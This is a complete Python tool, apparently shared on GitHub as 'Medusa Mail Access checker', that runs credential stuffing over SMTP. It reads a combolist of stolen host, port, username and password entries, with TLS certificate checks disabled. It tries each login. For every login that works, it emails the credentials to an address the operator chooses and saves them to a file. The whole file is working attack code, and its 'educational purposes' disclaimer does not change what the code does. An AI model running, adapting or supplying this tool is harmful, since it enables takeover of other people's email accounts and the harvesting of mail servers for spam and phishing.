#!/usr/local/bin/python3

'''
-------------------------------------------------------------------------------
PROJECT:    Medusa Mail Access checker V1.0
AUTHOR:     h3x0crypt @ GitHub.com

-------------------------------------------------------------------------------
INFO:       I've coded this small tool in my freetime
            SMTP checker for mailpass combolists
            IMPORTANT : Allowed to use the following code only for educational
            purposes!
            Wait for the updates /.
'''

# Python modules

import os, sys, smtplib, ssl, socket, time, math, signal, re

from os import system, name
from email.mime.text import MIMEText
from email.header import Header
from numpy import random
from alive_progress import alive_bar

# Colors

class bcolors:
    HEADER = "\033[95m"
    OKBLUE = "\033[94m"
    OKCYAN = "\033[96m"
    OKGREEN = "\033[92m"
    WARNING = "\033[93m"
    FAIL = "\033[91m"
    ENDC = "\033[0m"
    BOLD = "\033[1m"
    UNDERLINE = "\033[4m"

#clean my screen

def clear():
  
    # for windows
    if name == "nt":
        _ = system("cls")
  
    # for mac and linux
    else:
        _ = system("clear")

#pretty quit

def quit(signum, frame):
    print(f"\n{bcolors.WARNING}./ Exiting ... \n")
    sys.exit(0)


#banner

def banner():

    print(f"""{bcolors.BOLD}{bcolors.HEADER}
    _  _ ____ ___  _  _ ____ ____ 
    |\/| |___ |  \ |  | [__  |__| 
    |  | |___ |__/ |__| ___] |  | V1.0
        {bcolors.OKGREEN}
        Project : Mail Access checker
        Version : 1.0
        Author  : h3x0
        Github  : https://github.com/h3x0crypt

    """)
    print(f"""
{bcolors.WARNING}{bcolors.BOLD}\n\nIMPORTANT : List Format : HOST | PORT | USERNAME | PASSWORD {bcolors.ENDC}
    """)

#Reading combo file

def readFile(filename):

    if(os.path.isfile(str(filename)) == True):
        content = open(filename, 'r').read().split('\n')
        return True, content
    else:
        return False, None

#Email Verification

def emailverify(email):
    email_regex = '^([\w\.\-]+)@([\w\-]+)((\.(\w){2,63}){1,3})$'
    if re.search(email_regex, email):
        return True
    else:
        return False


#Args List

def Argv():
    global ListFile
    global UseMulti
    global Threads
    global OutputFile
    global ListContent
    global ReciverEmail
    global Timeout
    print(f"{bcolors.BOLD}")
    while True:
        try:
            ListFile = str(input(f'\n{bcolors.OKCYAN}> List File : '))
        except ValueError:
            print(f"{bcolors.FAIL}ERROR : Sorry, I didn't understand that.")
            continue
        isFile,ListContent = readFile(ListFile)
        if(isFile == True):
            break
        else:
            print(f"{bcolors.FAIL}ERROR : File Doesn't exists , please try again.")
            continue

    OutputFile = str(input(f'\n{bcolors.OKCYAN}> Output File : '))

    while True:
        try:
            ReciverEmail = str(input(f"\n{bcolors.OKCYAN}> Send Test To Email : "))
        except ValueError:
            print(f"{bcolors.FAIL}ERROR : Sorry, I didn't understand that.")
            continue

        if(emailverify(ReciverEmail) == True):
            break
        else:
            print(f"{bcolors.FAIL}ERROR : Please enter a valid email address .")
            continue
    while True:
        try:
            Timeout = int(input(f"\n{bcolors.OKCYAN}> Connection Timeout (s) : "))
        except ValueError:
            print(f"{bcolors.FAIL}ERROR : Sorry, I didn't understand that.")
            continue

        if(Timeout>0):
            break
        else:
            print(f"{bcolors.FAIL}ERROR : Please enter a valid Timeout (s) .")
            continue


# Smtp Function

def SmtpCheck(Params):
    smtp_info = Params.split('|')

    smtp_server = smtp_info[0]
    port = smtp_info[1]
    sender_email = smtp_info[2]
    password = smtp_info[3]
    receiver_email = ReciverEmail
    message = MIMEText(''+smtp_server+'|'+port+'|'+sender_email+'|'+password+'', 'plain', 'utf-8')
    message['From'] = str(Header(f"Medusa <{sender_email}>", 'utf-8'))
    x = random.randint(100000000)
    subject = 'New working smtp #'+str(x)+''
    message['Subject'] = Header(subject, 'utf-8')

    server = smtplib.SMTP(smtp_server,port)

    try:
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        if(port == '587'):
            server = smtplib.SMTP(smtp_server,port)
            server.ehlo() 
            server.starttls(context=context) 
            server.ehlo() 
        elif(port == '465'):
            server = smtplib.SMTP_SSL(smtp_server,port, timeout=Timeout)
            server.ehlo() 
        else:
            server = smtplib.SMTP(smtp_server,port)
            server.ehlo() 
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, message.as_string())
        server.quit()
        file_object = open(OutputFile, 'a')
        file_object.write(Params+"\n")
        file_object.close()
        return True
    except Exception as e:
        return False
        pass

# Main func

def main():
    Argv()
    valid = 0 
    invalid = 0
    Nb = int(len(ListContent))
    print(f"\n{bcolors.WARNING}./ Starting the proccess ...{bcolors.ENDC}\n")
    with alive_bar(Nb) as bar:
        for line in ListContent:
            response = SmtpCheck(line)
            if(response == True):
                valid += 1
            else:
                invalid += 1
            bar()

    print(f"""\n
{bcolors.OKGREEN}Proccess Completed !\n
{bcolors.OKCYAN}Total : {bcolors.BOLD}{Nb}{bcolors.ENDC}| {bcolors.OKGREEN}Valid : {bcolors.BOLD}{valid}{bcolors.ENDC} | {bcolors.FAIL}Invalid : {bcolors.BOLD}{invalid}{bcolors.ENDC}\n
{bcolors.WARNING}Check Valid results delivirability in your mailbox : {bcolors.BOLD}{ReciverEmail}{bcolors.ENDC}
{bcolors.WARNING}Valid result output file : {bcolors.BOLD}{OutputFile}{bcolors.ENDC}{bcolors.ENDC}\n\n
        """)

# Go charly 
if __name__ == "__main__":
    signal.signal(signal.SIGINT, quit)
    banner()
    main()

    
